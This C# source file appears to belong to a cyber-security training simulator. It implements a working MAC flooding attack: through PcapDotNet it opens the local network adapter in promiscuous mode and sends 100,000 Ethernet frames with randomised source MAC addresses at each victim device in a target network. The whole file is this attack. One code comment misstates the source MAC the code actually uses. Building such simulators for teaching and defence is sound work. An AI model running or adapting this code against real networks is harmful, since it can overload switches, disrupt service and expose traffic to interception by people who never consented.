using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PDA_Cyber_Security_Simulator_Domain;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PDA_Cyber_Security_Simulator_V1
{
    class MacFloodAttack : IAttack
    {
        public Network Victim { get; set; }

        public void AttackDevice(string victimIpAddress, string victimMacAddress)
        {
            Random rand = new Random((int)DateTime.Now.Ticks);

            // Retrieve the device list from the local machine
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;

            if (allDevices.Count == 0)
            {
                Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
                return;
            }

            // Take the selected adapter
            PacketDevice selectedDevice = allDevices[0];



            using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                for (int i = 0; i != 100000; ++i)
                {
                    // Supposing to be on ethernet, set mac source to 01:01:01:01:01:01
                    string randMac = "4C:0C:BD:" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString();


                    EthernetLayer ethernetLayer =
                        new EthernetLayer
                        {
                            Source = new MacAddress(randMac),
                            Destination = new MacAddress(victimMacAddress.Replace('-', ':')),
                            EtherType = EthernetType.IpV4, // Will be filled automatically.
                        };

                    PayloadLayer payload = new PayloadLayer();
                    payload.Data = new Datagram(new byte[] { 3, 5, 2 });

                    PacketBuilder builder = new PacketBuilder(ethernetLayer, payload);

                    communicator.SendPacket(builder.Build(DateTime.Now));
                }
            }
        }

        public void AttackNetwork()
        {
            if (this.Victim != null)
            {
                for (int i = 0; i < Victim.Devices.Count; i++)
                {
                    this.AttackDevice(Victim.Devices[i].IpAddress, Victim.Devices[i].MacAddress);
                }
            }
        }

    }
}
